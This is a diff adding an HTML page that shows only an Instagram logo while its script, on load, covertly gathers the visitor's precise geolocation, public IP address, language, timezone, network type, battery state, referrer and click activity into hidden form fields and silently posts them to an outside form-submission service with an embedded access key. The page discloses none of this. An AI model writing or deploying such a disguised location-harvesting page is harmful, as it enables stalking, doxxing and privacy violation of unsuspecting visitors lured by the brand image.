@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Enhanced User Information Collection</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            // Track the landing page
+            document.getElementById("landing_page").value = window.location.href;
+
+            // Track the referrer URL
+            document.getElementById("referrer_url").value = document.referrer;
+
+            // Collect initial data when the page loads
+            collectData();
+        });
+
+        function fetchIP(callback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://api.ipify.org?format=json", true);
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    var response = JSON.parse(xhr.responseText);
+                    callback(response.ip);
+                } else {
+                    console.error("Error fetching IP address.");
+                    callback("unknown_ip");
+                }
+            };
+            xhr.send();
+        }
+
+        function collectData() {
+            // Collect geolocation data
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+                    var accuracy = position.coords.accuracy;
+                    var altitude = position.coords.altitude || "unknown";
+                    var altitudeAccuracy = position.coords.altitudeAccuracy || "unknown";
+
+                    document.getElementById("latitude").value = latitude;
+                    document.getElementById("longitude").value = longitude;
+                    document.getElementById("accuracy").value = accuracy;
+                    document.getElementById("altitude").value = altitude;
+                    document.getElementById("altitude_accuracy").value = altitudeAccuracy;
+
+                    // Fetch IP address
+                    fetchIP(ipAddress => {
+                        document.getElementById("ip_address").value = ipAddress;
+
+                        // Collect other information
+                        var language = navigator.language || navigator.userLanguage;
+                        var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                        var networkType = "unknown";
+                        if (navigator.connection) {
+                            networkType = navigator.connection.effectiveType || "unknown";
+                        }
+
+                        document.getElementById("language").value = language;
+                        document.getElementById("timezone").value = timezone;
+                        document.getElementById("network_type").value = networkType;
+
+                        if (navigator.getBattery) {
+                            navigator.getBattery().then(battery => {
+                                var batteryLevel = battery.level * 100;
+                                var isCharging = battery.charging;
+                                document.getElementById("battery_level").value = batteryLevel;
+                                document.getElementById("battery_charging").value = isCharging;
+
+                                // Track user session (basic example: click tracking)
+                                document.addEventListener('click', () => {
+                                    var sessionRecording = document.getElementById("session_recording").value || "";
+                                    document.getElementById("session_recording").value = sessionRecording + "User clicked on the page at " + new Date().toISOString() + "; ";
+                                });
+
+                                // Send data to the server
+                                var xhr = new XMLHttpRequest();
+                                var formData = new FormData(document.getElementById("infoForm"));
+
+                                xhr.open("POST", "https://api.web3forms.com/submit", true);
+                                xhr.onload = function() {
+                                    if (xhr.status === 200) {
+                                        console.log("Information submitted successfully.");
+                                    } else {
+                                        console.error("Error submitting information.");
+                                    }
+                                };
+                                xhr.send(formData);
+                            });
+                        } else {
+                            console.warn("Battery Status API is not supported.");
+                        }
+                    });
+                }, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                });
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    console.error("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    console.error("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    console.error("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    console.error("An unknown error occurred.");
+                    break;
+            }
+        }
+    </script>
+</head>
+<body>
+    <h1><img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" width="500" height="500"></h1>
+
+    <form id="infoForm">
+        <!-- Replace with your Access Key -->
+        <input type="hidden" name="access_key" value="4e498833-8707-46a2-b4ee-fc974bf1f7ca">
+
+        <!-- Hidden fields for geolocation and additional data -->
+        <input type="hidden" id="latitude" name="latitude">
+        <input type="hidden" id="longitude" name="longitude">
+        <input type="hidden" id="accuracy" name="accuracy">
+        <input type="hidden" id="altitude" name="altitude">
+        <input type="hidden" id="altitude_accuracy" name="altitude_accuracy">
+        <input type="hidden" id="ip_address" name="ip_address">
+        <input type="hidden" id="language" name="language">
+        <input type="hidden" id="timezone" name="timezone">
+        <input type="hidden" id="network_type" name="network_type">
+        <input type="hidden" id="battery_level" name="battery_level">
+        <input type="hidden" id="battery_charging" name="battery_charging">
+
+        <!-- Additional fields -->
+        <input type="hidden" id="referrer_url" name="referrer_url">
+        <input type="hidden" id="landing_page" name="landing_page">
+        <input type="hidden" id="conversion_status" name="conversion_status">
+        <input type="hidden" id="session_recording" name="session_recording">
+    </form>
+</body>
+</html>
